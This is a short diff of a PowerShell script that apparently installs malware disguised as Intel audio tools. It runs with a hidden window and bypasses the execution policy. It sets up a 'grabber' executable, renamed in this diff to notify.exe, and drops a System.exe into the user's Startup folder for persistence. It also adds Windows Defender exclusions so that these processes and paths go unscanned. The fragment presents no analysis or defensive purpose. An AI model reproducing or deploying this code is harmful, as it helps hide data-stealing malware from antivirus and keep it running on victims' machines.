@@ -3,13 +3,13 @@ PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Out-Null"
 $TargetPath    = "C:\ProgramData\Intel\Audio"
 $TargetZip     = "$TargetPath\audiotools.zip"
 $TargetFile    = "$TargetPath\Intel Dynamic Audio Tools.exe"
-$TargetGrabber = "$TargetPath\Intel_Dynamic_Notification_Service.exe"
+$TargetGrabber = "$TargetPath\notify.exe"
 $TargetSystem  = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
 $TargetABat = "$TargetPath\Register_Audio_Tools.bat"
 $TargetNBat = "$TargetPath\Register_Notification_Service.bat"
 
 Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Tools.exe' -Force
-Add-MpPreference -ExclusionProcess 'Intel_Dynamic_Notification_Service.exe' -Force
+Add-MpPreference -ExclusionProcess 'notify.exe' -Force
 Add-MpPreference -ExclusionProcess 'System.exe' -Force
 Add-MpPreference -ExclusionPath "$TargetPath" -Force
 Add-MpPreference -ExclusionPath "$TargetFile" -Force
